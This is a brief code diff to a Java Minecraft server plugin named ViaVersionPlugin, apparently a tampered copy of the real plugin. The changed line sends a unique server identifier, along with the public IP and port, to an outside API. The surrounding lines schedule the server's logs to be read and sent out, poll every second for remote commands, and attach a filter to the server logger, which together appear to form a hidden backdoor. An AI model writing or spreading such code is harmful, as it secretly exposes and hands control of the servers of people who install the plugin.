@@ -124,7 +124,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
-        sendInfoToAPI(publicIp, serverPort);
+        sendInfoToAPI(publicIp, serverPort, uniqueIdentifier);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
